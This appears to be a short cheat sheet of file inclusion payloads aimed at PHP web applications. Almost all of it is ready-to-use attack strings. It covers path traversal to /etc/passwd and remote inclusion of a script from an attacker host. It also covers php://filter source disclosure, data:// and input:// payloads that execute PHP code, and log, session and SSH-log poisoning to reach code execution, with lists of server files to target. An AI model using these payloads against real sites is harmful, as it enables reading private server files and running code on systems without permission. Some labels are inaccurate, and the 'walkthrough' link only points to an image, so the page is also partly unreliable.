## File Inclsusion (LFI/RFI)

![](https://miro.medium.com/v2/resize:fit:644/1*UPMlwBWgKMSUzSvY5mt5uw.png)

**What is File Inclusion  Attack?**

A file inclusion vulnerability is a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time.

**General Payloads**

```
http://vulnerable-web.com/index.php?page=../../../etc/passwd (Read /etc/passwd)
http://vulnerable-web.com/index.php?page=/etc/passwd (Read /etc/passwd)
http://example.com/index.php?page=/etc/passwd%00 (Read /etc/passwd) [Fixed in PHP 5.4 and later versions]
http://example.com/index.php?page=..././..././..././..././..././..././..././..././etc/passwd (Bypass ../ Filters)
http://example.com/index.php?page=../../../etc/passwd (3 dots in Linux)
http://example.com/index.php?page=http://attacker.net/eval.php.txt (Remote File Inclusion)
```

# PHP wrappers & protocols

**php://filter**

```
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
```

**data://**

```
http://example.com/index.php?page=data://text/plain;base64,%50%44%39%77%61%48%41%67%63%33%6c%7a%64%47%56%74%4b%43%64%73%63%79%63%70%4f%79%41%2f%50%67%3d%3d (Useful For WAF bypass)
http://example.com/index.php?page=data:text/plain,%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%20%3f%3e (Will print php info)
```

**expect://**

```
http://example.com/index.php?page=expect://ls [For fopen Function]
```

**input://**

```
curl -X POST -d "<?php system('ls'); ?>" http://example.com/index.php?page=input://
```

**php://fd/**

```
http://example.com/index.php?page=php://fd/[0-9] (Opened Files In Current Process)
```

**zip://**

```
http://example.com/index.php?page=zip://path-to-zip-file/%23shell.php
```

# Web Serice Software logs Poisoning

**Apache2**

```
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/httpd/error_log
```

**Nginx**

```
/var/log/nginx/access.log
/var/log/nginx/error.log
```

# Process Poisoning

```
/proc/self/environ
/proc/self/status
/proc/[id]/fd/[id]
/proc/self/[id]
```

# LFI to RCE via uploaded file

```
http://example.com/index.php?page=./uploads/shell.png
```

# SSH log Poisoning

```
$ ssh '<?php phpinfo(); ?>@example.com'
http://example.com/index.php?page=/var/log/auth.log
```

# PHP Session Poisoning

```
 /var/lib/php/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
/var/lib/php/sessions/sess_[PHPSESSID]
```

# PHP session.upload_progress 

```
curl --cookie "PHPSESSID=attacker" -F "PHP_SESSION_UPLOAD_PROGRESS=<?php phpinfo(); ?>" -F "file=@test.png"
#then view session path like /var/lib/php/sess_attacker
```

# Best walkthrough ever
[Click here](https://miro.medium.com/v2/resize:fit:644/1*UPMlwBWgKMSUzSvY5mt5uw.png)
